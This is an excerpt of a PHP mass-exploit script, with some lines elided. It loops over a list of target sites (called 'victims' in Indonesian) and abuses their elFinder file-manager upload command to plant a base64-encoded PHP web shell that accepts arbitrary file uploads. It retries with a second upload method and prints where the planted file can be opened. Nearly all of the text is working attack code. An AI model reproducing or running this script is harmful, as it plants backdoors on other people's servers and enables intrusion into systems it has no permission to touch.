...
if($_POST['x']) {
    foreach($target as $korban) {
        ...
        $isi_nama_doang =
"PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
...
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
        ...
        if(preg_match("/$nama_doang/", $output_mkfile)) {
            echo "# Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...<br><br>";
        } else {
            echo "# Upload Gagal Cok! 1 <br># Uploading 2..<br>";
            $upload_ah = ngirim("$korban?cmd=upload", $post2);
            if(preg_match("/$nama_doang/", $upload_ah)) {
                echo "# Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...<br><br>";
            } else {
                echo "# Upload Gagal Lagi Cok! 2<br><br>";}}}}
?>